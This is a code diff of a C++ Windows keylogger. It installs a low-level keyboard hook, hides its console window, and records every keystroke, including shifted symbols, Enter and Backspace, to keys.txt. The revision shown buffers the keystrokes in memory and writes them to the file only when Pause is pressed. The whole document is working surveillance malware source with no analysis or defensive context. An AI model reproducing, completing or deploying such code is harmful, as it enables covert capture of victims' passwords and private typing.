@@ -10,14 +10,13 @@
 #include <fstream>
 //imports
 HHOOK hook;
-bool running = true;
 std::string path = "keys.txt";
 std::ofstream File(path);
 bool _shiftdown = false;
 bool _capsdown = false;
 
 
-
+std::string keys = "";
 void keyCompareDown_(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
 		KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
@@ -25,97 +24,97 @@ void keyCompareDown_(int nCode, WPARAM wParam, LPARAM lParam) {
 		char specials_[10] = { ')','!','@','#','$','%','^','&','*','(' };
 		for (int specialsc_ = 0; specialsc_ < 10; specialsc_++) {
 			if (_shiftdown && pKeyStruct->vkCode == 48 + specialsc_) {
-				File << specials_[specialsc_];
+				keys = keys + specials_[specialsc_];
 			}
 		}
 
 		if (pKeyStruct->vkCode == VK_OEM_1) {
 			if (_shiftdown) {
-				File << ':';
+				keys = keys + ':';
 			}
 			else {
-				File << ';';
+				keys = keys + ';';
 			}
 		}
 		else if (pKeyStruct->vkCode == VK_OEM_2) {
 			if (_shiftdown) {
-				File << '?';
+				keys = keys + '?';
 			}
 			else {
-				File << '/';
+				keys = keys + '/';
 			}
 		}
 		else if (pKeyStruct->vkCode == VK_OEM_3) {
 			if (_shiftdown) {
-				File << '~';
+				keys = keys + '~';
 			}
 			else {
-				File << '`';
+				keys = keys + '`';
 			}
 		}
 		else if (pKeyStruct->vkCode == VK_OEM_4) {
 			if (_shiftdown) {
-				File << '{';
+				keys = keys + '{';
 			}
 			else {
-				File << '[';
+				keys = keys + '[';
 			}
 		}
 		else if (pKeyStruct->vkCode == VK_OEM_5) {
 			if (_shiftdown) {
-				File << '|';
+				keys = keys + '|';
 			}
 			else {
-				File << '\\';
+				keys = keys + '\\';
 			}
 		}
 
 		else if (pKeyStruct->vkCode == VK_OEM_6) {
 			if (_shiftdown) {
-				File << '}';
+				keys = keys + '}';
 			}
 			else {
-				File << ']';
+				keys = keys + ']';
 			}
 		}
 		else if (pKeyStruct->vkCode == VK_OEM_7) {
 			if (_shiftdown) {
-				File << '\"';
+				keys = keys + '\"';
 			}
 			else {
-				File << '\'';
+				keys = keys + '\'';
 			}
 		}
 		else if (pKeyStruct->vkCode == VK_OEM_COMMA) {
 			if (_shiftdown) {
-				File << '<';
+				keys = keys + '<';
 			}
 			else {
-				File << ',';
+				keys = keys + ',';
 			}
 		}
 		else if (pKeyStruct->vkCode == VK_OEM_PERIOD) {
 			if (_shiftdown) {
-				File << '>';
+				keys = keys + '>';
 			}
 			else {
-				File << '.';
+				keys = keys + '.';
 			}
 		}
 		else if (pKeyStruct->vkCode == VK_OEM_MINUS) {
 			if (_shiftdown) {
-				File << '_';
+				keys = keys + '_';
 			}
 			else {
-				File << '-';
+				keys = keys + '-';
 			}
 		}
 		else if (pKeyStruct->vkCode == VK_OEM_PLUS) {
 			if (_shiftdown) {
-				File << '+';
+				keys = keys + '+';
 			}
 			else {
-				File << '=';
+				keys = keys + '=';
 			}
 		}
 
@@ -123,11 +122,12 @@ void keyCompareDown_(int nCode, WPARAM wParam, LPARAM lParam) {
 
 		else if (pKeyStruct->vkCode == VK_BACK)
 		{
-			File << " |BACKSPACE| ";
+			keys = keys + " |BACKSPACE| ";
 			Sleep(100);
 		}
 		else if (pKeyStruct->vkCode == VK_PAUSE) {
 
+			File << keys;
 			File.close();
 
 			UnhookWindowsHookEx(hook);
@@ -137,13 +137,13 @@ void keyCompareDown_(int nCode, WPARAM wParam, LPARAM lParam) {
 			_capsdown = true;
 		}
 		else if (pKeyStruct->vkCode == VK_RETURN) {
-			File << " |ENTER| ";
+			keys = keys + " |ENTER| ";
 		}
 		else if (_shiftdown == false) {
 			for (int x = 7; x < 128; x++) {
 
 				if (pKeyStruct->vkCode == x) {
-					File << (char)pKeyStruct->vkCode;
+					keys = keys + (char)pKeyStruct->vkCode;
 					Sleep(100);
 				}
 
@@ -170,7 +170,7 @@ int main() {
 	FreeConsole();
 	hook = SetWindowsHookEx(WH_KEYBOARD_LL,KeyboardProc,NULL,0);
 	MSG m;
-	while (running == true) {
+	while (1) {
 
 		GetMessage(&m,NULL,0,0);
 		TranslateMessage(&m);
@@ -182,4 +182,3 @@ int main() {
 }
 
 
-//REVISION 3
